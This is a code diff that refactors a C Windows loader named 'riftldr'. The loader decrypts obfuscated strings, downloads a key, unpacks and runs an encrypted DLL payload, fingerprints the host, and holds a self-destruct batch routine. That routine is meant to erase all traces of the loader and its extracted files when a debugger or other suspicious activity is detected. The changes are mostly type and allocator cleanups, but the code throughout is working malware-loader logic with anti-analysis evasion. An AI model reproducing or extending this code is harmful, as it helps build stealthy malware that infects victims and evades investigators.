@@ -1,16 +1,16 @@
 #include "_riftldr.h"
 
-typedef STATUS(WINAPI* DllEntry)(
+typedef status(WINAPI* DllEntry)(
 	_In_ HINSTANCE hinstDLL,
 	_In_ DWORD fdwReason,
-	_In_ PVOID pvReserved
+	_In_ void* pvReserved
 );
 
-STATUS WINAPI wWinMain(
+int WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_     PWSTR     pCmdLine,
-	_In_     INT       nCmdShow
+	_In_     int       nCmdShow
 ) {
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
@@ -20,8 +20,10 @@ STATUS WINAPI wWinMain(
 		EXoshiroBegin(NULL);
 		IGenerateHardwareId(&g_PIB->sID.HW);
 		IGenerateSessionId(&g_PIB->sID.SE);
-		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, &g_PIB->sArg.n); // bugy (sometimes causes an excepion)
+		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
 	}
+
+
 
 	// WCHAR UUid[UUID_STRLEN + 1];
 	// EUidToStringW(&g_PIB->sID.HW, UUid, UUID_STRLEN);
@@ -37,18 +39,20 @@ STATUS WINAPI wWinMain(
 	}
 
 	// Create Random Mutex using SeId
-	SIZE_T nResult;
+#if 0
+	size_t nResult;
 	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
-	PWSTR szMutex = AllocMemory(MAX_PATH * sizeof(WCHAR));
+	PWSTR szMutex = malloc(MAX_PATH * sizeof(WCHAR));
 	StringCchCopyW(szMutex, MAX_PATH, szLocal);
-	FreeMemory(szLocal);
-	PVOID pHWID = AllocMemory(sizeof(MD5));
-	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(MD5));
-	PCWSTR szRandom = EAllocRandomBase64StringW(pHWID, MAX_PATH / 2, MAX_PATH - 7);
-	FreeMemory(pHWID);
+	free((void*)szLocal);
+	void* pHWID = malloc(sizeof(md5));
+	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(md5));
+	PCWSTR szRandom = EAllocRandomBase64StringW((dword*)pHWID, MAX_PATH / 2, MAX_PATH - 7);
+	free(pHWID);
 	StringCchCatW(szMutex, MAX_PATH, szRandom);
-	FreeMemory(szRandom);
+	free((void*)szRandom);
 	// CreateMutexW(0, FALSE, szMutex);
+#endif
 
 	// init con
 	IOpenConsole();
@@ -63,9 +67,9 @@ STATUS WINAPI wWinMain(
 		}
 	}
 
-	PVOID pWKey = IDownloadKey();
+	void* pWKey = IDownloadKey();
 	if (!pWKey) {
-		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH);
+		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
 		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
@@ -74,8 +78,8 @@ STATUS WINAPI wWinMain(
 	else
 		return 0x45e0;
 
-	SIZE_T nDll;
-	PVOID pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
+	size_t nDll;
+	void* pDll = EUnpackResource(&g_PIB->sCIB.WK, IDR_RIFTDLL, &nDll);
 	if (!pDll)
 		return 0x132d;
 
@@ -87,12 +91,12 @@ STATUS WINAPI wWinMain(
 		return 0x2ab5;
 
 	DllEntry DllMain = (DllEntry)GetProcAddress(dhDll, "DllMain");
-	STATUS bTest = DllMain(NULL, 4, g_PIB);
+	status bTest = DllMain(NULL, 4, g_PIB);
 
 	FreeLibrary(dhDll);
 #endif
 	SecureZeroMemory(pDll, nDll);
-	FreeMemory(pDll);
+	free(pDll);
 
 	{	// CleanUp
 		EXoshiroEnd(NULL);
@@ -106,7 +110,7 @@ STATUS WINAPI wWinMain(
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered (/called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-CONST STATIC WCHAR l_szSelfDelBat[] = {
+const static WCHAR l_szSelfDelBat[] = {
 	L"@echo off\n"
 	L"%x:\n"
 	L"\tdel \"%s\" /f\n"
@@ -117,26 +121,26 @@ CONST STATIC WCHAR l_szSelfDelBat[] = {
 };
 VOID ESelfDestruct() {
 	// Prepare String for Filename of Batchfile
-	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR));
+	PWSTR szFilePath = (PWSTR)malloc(MAX_PATH * sizeof(WCHAR));
 	PCWSTR szRandom = EAllocRandomPathW(NULL, 8, 16);
 	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
 	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
-	PVOID pScriptW = AllocMemory(0x800);
-	UINT uiRandomID = EXoshiroSS(NULL);
+	void* pScriptW = malloc(0x800);
+	uint uiRandomID = EXoshiroSS(NULL);
 	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->sMod.szMFN);
 	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
 
 	// Convert to Raw (ANSI)
-	SIZE_T nScript;
+	size_t nScript;
 	StringCchLengthW(pScriptW, 0x400, &nScript);
-	PSTR pScriptA = AllocMemory(0x400);
+	PSTR pScriptA = malloc(0x400);
 	WideCharToMultiByte(CP_ACP, NULL, pScriptW, -1, pScriptA, 0x400, NULL, NULL);
-	FreeMemory(pScriptW);
+	free(pScriptW);
 
 	// Write to Disk
 	WriteFileCW(szFilePath, pScriptA, nScript);
-	FreeMemory(pScriptA);
+	free(pScriptA);
 }
